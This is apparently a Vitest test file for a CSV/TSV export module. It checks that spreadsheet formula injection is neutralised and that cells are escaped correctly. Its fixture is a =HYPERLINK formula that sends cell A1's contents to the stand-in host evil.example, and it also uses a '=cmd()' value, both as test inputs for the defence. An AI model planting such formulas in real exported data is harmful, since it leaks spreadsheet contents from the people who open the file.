import { describe, it, expect } from 'vitest';
import {
  csvRow,
  rowsToCsv,
  rowsToTsv,
  escapeCsvCell,
  escapeTsvCell,
  neutralizeSpreadsheetFormula,
} from './csvExport';

const HYPERLINK = '=HYPERLINK("https://evil.example/?c="&A1,"Click me")';

describe('neutralizeSpreadsheetFormula', () => {
  it('prefixes a quote on formula-leading values', () => {
    expect(neutralizeSpreadsheetFormula('=1+1')).toBe("'=1+1");
    expect(neutralizeSpreadsheetFormula('safe')).toBe('safe');
    expect(neutralizeSpreadsheetFormula('')).toBe('');
  });
});

describe('escapeCsvCell', () => {
  it('neutralizes a =HYPERLINK payload and doubles its quotes', () => {
    expect(escapeCsvCell(HYPERLINK)).toBe(
      `"'=HYPERLINK(""https://evil.example/?c=""&A1,""Click me"")"`,
    );
  });

  it('coerces non-string cells without losing neutralization', () => {
    expect(escapeCsvCell(42)).toBe('"42"');
    expect(escapeCsvCell(null)).toBe('""');
    expect(escapeCsvCell(undefined)).toBe('""');
    expect(escapeCsvCell(new Date('2026-09-18T00:00:00.000Z'))).toBe(
      '"2026-09-18T00:00:00.000Z"',
    );
    expect(escapeCsvCell('-1+1')).toBe(`"'-1+1"`);
  });
});

describe('csvRow', () => {
  it('escapes every field including the first', () => {
    expect(csvRow([HYPERLINK, 'plain'])).toBe(
      `"'=HYPERLINK(""https://evil.example/?c=""&A1,""Click me"")","plain"`,
    );
  });
});

describe('rowsToCsv', () => {
  it('returns empty string for no rows', () => {
    expect(rowsToCsv([])).toBe('');
  });

  it('renders headers from the first row and quotes every cell', () => {
    const csv = rowsToCsv([{ hostname: 'pc-1', os: 'windows' }, { hostname: 'pc-2', os: 'macos' }]);
    expect(csv).toBe('"hostname","os"\n"pc-1","windows"\n"pc-2","macos"');
  });

  it('neutralizes formula injection in body cells', () => {
    const csv = rowsToCsv([{ note: '=cmd()' }]);
    expect(csv).toBe(`"note"\n${escapeCsvCell('=cmd()')}`);
    expect(csv).toContain("'=cmd()");
  });

  // Headers come from Object.keys of report rows / arbitrary exported datasets
  // (custom-field names, SQL column aliases), so they are as dynamic as body
  // cells and need the same treatment.
  it('neutralizes a formula payload in a HEADER key', () => {
    const csv = rowsToCsv([{ [HYPERLINK]: 'value' }]);
    const headerLine = csv.split('\n')[0]!;
    expect(headerLine.startsWith('"=')).toBe(false);
    expect(headerLine).toBe(escapeCsvCell(HYPERLINK));
  });

  it('quotes a header containing a comma so the row shape survives', () => {
    const csv = rowsToCsv([{ 'a,b': 1, c: 2 }]);
    expect(csv.split('\n')[0]).toBe('"a,b","c"');
  });

  it('renders null/undefined cells as empty', () => {
    expect(rowsToCsv([{ a: null, b: undefined }])).toBe('"a","b"\n"",""');
  });
});

describe('rowsToTsv', () => {
  it('returns empty string for no rows', () => {
    expect(rowsToTsv([])).toBe('');
  });

  it('tab-separates and only quotes cells needing it', () => {
    const tsv = rowsToTsv([{ a: 'x', b: 'has\ttab' }]);
    expect(tsv).toBe('a\tb\nx\t"has\ttab"');
  });

  it('neutralizes a formula payload in a HEADER key', () => {
    const tsv = rowsToTsv([{ [HYPERLINK]: 'value' }]);
    const headerLine = tsv.split('\n')[0]!;
    expect(headerLine.startsWith('=')).toBe(false);
    expect(headerLine).toBe(escapeTsvCell(HYPERLINK));
  });
});
